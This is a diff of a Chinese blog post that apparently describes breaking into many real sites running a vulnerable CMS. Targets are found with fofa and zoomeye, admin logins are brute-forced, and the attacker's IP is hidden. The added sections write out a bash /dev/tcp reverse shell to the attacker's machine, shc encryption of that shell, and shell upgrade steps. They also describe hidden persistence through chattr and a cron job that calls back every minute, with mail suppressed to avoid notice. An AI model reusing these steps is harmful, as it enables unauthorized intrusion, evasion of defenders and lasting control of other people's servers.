@@ -334,7 +334,7 @@
 
 
                 <time class="article-time--reading">
-                    8 minute read
+                    12 minute read
                 </time>
             </div>
         
@@ -381,7 +381,7 @@
 <p>只能暂时放弃这一条路了,再研究下去不知道要研究多久,但是手动肯定更麻烦而且更慢,于是决定试一下一直听说但一直没用过的selenium</p>
 <p>简单看了一下文档,发现挺简单的,而且用这个肯定不会被识别出来,于是愉快的爬了bing的搜索结果</p>
 <h5 id="fofa和zoomeye">fofa和zoomeye</h5>
-<p>这两个都有自己的搜索语法,而且比较简单,就不赘述了,注意fofa可以直接搜索web app,也可以通过搜索web app的指纹,两个的搜索结果是否一样要另说</p>
+<p>这两个都有自己的搜索语法,而且比较简单,就不赘述了,注意fofa可以直接搜索web app,也可以搜索web app的指纹,两个的搜索结果是否一样要另说</p>
 <h5 id="收集到的url的处理">收集到的url的处理</h5>
 <p>首先把gov.cn域名的url去掉,然后再去重,最后保存起来就ok了</p>
 <h4 id="找后台">找后台</h4>
@@ -391,8 +391,8 @@
 <p>不过最近我用这个repository的导出功能时,发现这个repository导出到html格式的功能有bug,批量爆破时可能会所有结果的domain都是第一个url的,或者直接导出的html文件内容为空</p>
 <p>最后找不到后台的站就直接放弃了</p>
 <h4 id="找后台密码">找后台密码</h4>
-<p>这个cms没有默认的密码,安装的时候需要你设置密码</p>
-<p>同时这个cms在用户名不存在和密码错误时返回的内容不一样</p>
+<p>这个cms没有默认的用户名和密码,安装的时候需要手动设置用户名和密码</p>
+<p>同时这个cms在用户名不存在时和密码错误时返回的内容不一样</p>
 <p>所以先写个脚本批量试一下常见的用户名,注意漏洞存在的版本中,低版本的站不需要csrf,高版本的站需要csrf,csrf从后台登陆页面的html里有</p>
 <p>因为这一步比较简单,就没用工具,自己写的,然后把不存在常见用户名的后台丢到burp suite里跑,用户名和密码的字典可以自己收集然后汇总一下,前段时间我刚自己整合了几个star比较多的repository的后台字典,以后用用看看怎么样</p>
 <p>然后没爆破到用户名的站直接放弃,爆破到用户名的站先试一下常见的弱口令,admin,123456,用户名这样的,用脚本一会就跑完了,再把没用常见的弱口令的后台丢到burp suite爆破一遍密码,爆破的时间可以去看看前面跑出来用户名和密码的站</p>
@@ -409,30 +409,152 @@
 <h4 id="32-隐藏ip">3.2 隐藏ip</h4>
 <p>隐藏攻击ip还是很重要的,不然容易被溯源,可以上cdn或者用云函数等</p>
 <p>但是此处也是有大坑的,能访问国外服务器的目标机器就好办了,直接上就行,但是不能访问国外服务器的目标机器,首先用Cloudflare比较卡,其次用国内的云服务商的则需要实名,而且费用也不低,所以实在没办法就别隐藏了</p>
-<h4 id="33-反弹shell">3.3 反弹shell</h4>
+<h4 id="33-加密bash反弹shell">3.3 加密bash反弹shell</h4>
+<p>bash反弹shell:</p>
+<p>目标机器反弹shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/攻击机的ip/攻击机接收shell的端口 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击机接收反弹来的shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvvp 攻击机接收shell的端口
+</span></span><span class="line"><span class="cl">//netcat版本低时l和p参数不兼容,可以nc -lvv port监听端口
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用<a class="link" href="https://github.com/neurobin/shc"  target="_blank" rel="noopener"
+    >https://github.com/neurobin/shc</a>这个repository加密一下bash脚本,加密后会生成一个c源代码文件和编译之后的二进制文件,把编译之后的二进制文件传到目标机器上执行就行了,可以弥补一下目标机器在国内时不便于隐藏攻击ip的缺陷</p>
 <p>webshell提供的shell环境限制很多,所以最好先反弹shell,尽量不要正向连接shell,开个端口动静太大</p>
 <p>首先是不能弹shell的情况,比如相关的bash,nc等命令都被限制了,那先尝试提权</p>
 <p>能弹shell但是接收不到的时候,可以看一下目标是不是限制出网或者限制出站端口</p>
 <p>如果限制出网那就先尝试提权,如果限制出站端口可以批量试一下常见的端口,在自己的vps上,通过nginx监听多个端口来快速启动多个端口,然后再在目标机器上上传个sh脚本,批量curl自己vps的指定端口,最后看一下结果就可以了,nmap &mdash;top-ports 100或1000可以扫描nmap整理的100或1000个最常用的端口,可以参考一下</p>
 <p>成功收到shell的时候,依旧是个很难用的shell,可以再升级成完全的shell再用,升级之后和真实shell一样,非常舒服</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 攻击机本地执行</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 首先检查当前终端和STTY信息</span>
+</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="nv">$TERM</span>      
+</span></span><span class="line"><span class="cl">$ stty -a 
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看输出的rows和columns,后面配置用</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 此时攻击机已经获取到了bash</span>
+</span></span><span class="line"><span class="cl">$ python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">$ ctrl + z //快捷键
+</span></span><span class="line"><span class="cl">$ stty raw -echo
+</span></span><span class="line"><span class="cl">$ <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl">$ reset //这一步我实测有问题,输了会出问题,不输也没有影响,所以如果输了有问题可以不输
+</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm-256color
+</span></span><span class="line"><span class="cl">$ stty rows 行数 columns 列数
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此处的这些操作是重复性的,和具体设备无关,所以用xshell的可以写个xshell的脚本或者录制个xshell的脚本,不过我这边录制的时候生成的脚本内容总是为空,应该是个bug,也没时间研究写xshell的脚本了,所以直接用按键精灵写了个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">SayString</span> <span class="s2">&#34;python -c &#39;import pty; pty.spawn(&#34;&#34;/bin/bash&#34;&#34;)&#39;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SayString</span> <span class="s2">&#34;stty raw -echo&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SayString</span> <span class="s2">&#34;fg&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SayString</span> <span class="s2">&#34;export SHELL=bash&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SayString</span> <span class="s2">&#34;export TERM=xterm-256color&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">WaitKey</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SayString</span> <span class="s2">&#34;stty rows 45 columns 184&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>毕竟按键精灵只是模仿输入,不能获取到结果,所以每一步都是只输入,不回车,需要自己回车,而且每一次输入之后会多监听一次任意按键事件,以防想暂停</p>
+<p>如果想把这个shell关了,或者这个shell接收到了内网的其他shell,然后想把接收到的其他shell关了,需要输入两次exit退出,然后可能shell的格式是乱的,这时候<code>reset</code>一下就好了</p>
+<p>在攻击机上肯定不可能直接就接收shell,如果本地和攻击机的shell连接断了,那么攻击机和目标机器的shell也就断了,或者想把攻击机接收到的shell挂在后台,也不能直接接收shell,此处我推荐使用<code>screen</code>,类似于windows下的多窗口,接收shell的时候新开一个screen挂在后台,不用的时候就在后台挂着,用的时候切过去用就可以了</p>
 <h4 id="34-低权限提权">3.4 低权限提权</h4>
 <p>前面成功getshell的站全都是linux的,一个windows的也没有,而且清一色的都是CentOS,一个Ubuntu,Debian或者其他的系统都没有,同时基本都是低权限,那就需要提权了</p>
 <p>首先是信息收集,看一下/proc/version和/etc/*-release,然后在google和Exploit Database上找一下,同时看看打没打补丁,如果目标机器不能编译的话可以在自己的机器上编译好了传过去,利用成功就直接root了,不成功就只能继续试了,此处也有几个提权工具,不过我试了一下不是很好用,都是靠版本来判断的,和手动搞一样</p>
 <h4 id="35-权限维持">3.5 权限维持</h4>
 <p>切记要做持久化,不然辛辛苦苦拿的shell可能就要重新拿或者没了,方法很多,可以google搜一下,与时俱进,用最新的东西</p>
+<p>cron计划任务权限维持比较简单,当然也比较明显:</p>
+<p>建议用前面说的shc加密,上传生成的二进制文件,用这个二进制文件弹shell,安全性高一点</p>
+<p>上传之后,先<code>chmod +x 二进制文件</code>给一下权限,然后在名字前面加个<code>.</code>变为隐藏文件,再尝试一下<code>chattr +i 二进制文件</code>防止删除,有相应的权限才能成功执行这条命令,最后把这个文件放在安全又隐秘的位置</p>
+<p>配置cron计划任务时,如果是root用户,那就在/etc/crontab里添加,如果不是root用户,那就用<code>crontab -e</code>添加,注意<code>crontab -e</code>需要交互式shell,理论上来说非root用户的cron存在/var/spool/crond下(CentOS),可以直接编辑相应的文件,但是非root用户通常没有权限直接编辑,所以还是需要获取交互式shell然后<code>crontab -e</code>添加</p>
+<p>/etc/crontab里应该有默认的配置和默认的例子,<code>crontab -e</code>没有,建议使用以下配置:</p>
+<p>在编辑之前先执行<code>$PATH</code>查看环境变量并复制,然后再编辑</p>
+<p>首先第一行<code>SHELL=</code>配置为相应的shell位置,第二行<code>PATH=</code>配置为默认的(如果有的话)加上前面的<code>$PATH</code>,第三行<code>MAILTO=&quot;&quot;</code>,第三行的意义是计划任务的执行结果不给用户发邮件,因为计划任务反弹shell是不停的反弹,但是攻击机如果之前接收到的shell还没关就会报错然后发邮件,发了邮件的话每次执行命令都会提示,很容易就被发现了</p>
+<p>最后配置计划任务:</p>
+<p>root用户配置为<code>* * * * * root /要执行的命令或文件</code></p>
+<p>非root用户配置为<code>* * * * * /要执行的命令或文件</code></p>
+<p>cron的语法可以学一下,上面的是每分钟弹一次shell</p>
 <h4 id="36-内网">3.6 内网</h4>
 <h5 id="361-信息收集">3.6.1 信息收集</h5>
 <p>激动人心的时刻来了,打内网</p>
 <p>因为我拿到的shell都是linux下的,没有类似windows上的域控等等,所以此处就扫扫端口,此处可以用nmap,也可以用fscan,强烈推荐fscan,用一次就上瘾,很好用</p>
 <h5 id="362-搭建代理">3.6.2 搭建代理</h5>
 <p>有些内网ip的端口上跑的比如网站等等在命令行不太好渗透,而且有些内网ip是不出网的,只能通过我们打下来的这个边界服务器来访问,所以建个代理还是很有必要的</p>
-<p>此处我推荐用frp,然后依旧遵循动静小点的原则,不在目标机器上开端口,在自己的vps上架设frp的服务端,在目标机器上架设frp的客户端,然后在客户端启用socks5代理插件,这会在服务端上开一个你指定的端口用来做socks5代理,可以配置用户名和密码,还可以远程连接,同时可以搭配其他软件做ip的黑白名单,非常好用,本地配置代理Windows建议用Proxifier,Linux建议用proxychains ng</p>
-<p>另外也可以用Neo-reGeorg,直接上传个php/jsp等文件就可以建socks5代理,也很好用</p>
+<p>此处我推荐用frp,然后依旧遵循动静小点的原则,不在目标机器上开端口,在自己的vps上架设frp的服务端,在目标机器上架设frp的客户端,然后在客户端启用socks5代理插件,这会在服务端上开一个你指定的端口用来做socks5代理,可以配置用户名和密码,还可以远程连接,同时可以搭配其他软件做ip的黑白名单,非常好用,本地配置代理Windows建议用Proxifier,Linux建议用proxychains-ng(proxychains4)</p>
+<p>另外也可以用Neo-reGeorg,直接上传个php/jsp等文件就可以建socks5代理,也很好用,对比frp一个优点是只传文件不用执行命令就可以建代理,另一个优点是不用在目标机器上额外在后台挂一个程序</p>
 <h5 id="363-内网渗透">3.6.3 内网渗透</h5>
 <p>其实和前面的web渗透一样,只不过有些应用在内网比较常见,所以需要去了解一下,搜一下有什么漏洞</p>
 <p>fscan本身会检测漏洞,比如各种未授权访问,也会爆破一些端口的服务,比如mysql,ssh或者Tomcat的Manager App的弱口令等</p>
 <p>一个C段可以见识不少东西,打了一遍下来竟然天亮了&hellip;一天一夜过去了</p>
-<p>具体就不细说了,遇见那个搜那个</p>
+<p>具体就不细说了,遇见哪个搜哪个</p>
 <p>该学考研的了</p>
 <h5 id="364-内网不出网反弹shell">3.6.4 内网不出网反弹shell</h5>
 <p>目标机器如果不出网可以反弹到已经打下来的内网机器上,同时可以再把反弹的端口转发到vps上,实现通过转发出网</p>
@@ -772,7 +894,7 @@
           <ol>
             <li><a href="#绕php的disable_functions">绕php的disable_functions</a></li>
             <li><a href="#32-隐藏ip">3.2 隐藏ip</a></li>
-            <li><a href="#33-反弹shell">3.3 反弹shell</a></li>
+            <li><a href="#33-加密bash反弹shell">3.3 加密bash反弹shell</a></li>
             <li><a href="#34-低权限提权">3.4 低权限提权</a></li>
             <li><a href="#35-权限维持">3.5 权限维持</a></li>
             <li><a href="#36-内网">3.6 内网</a></li>
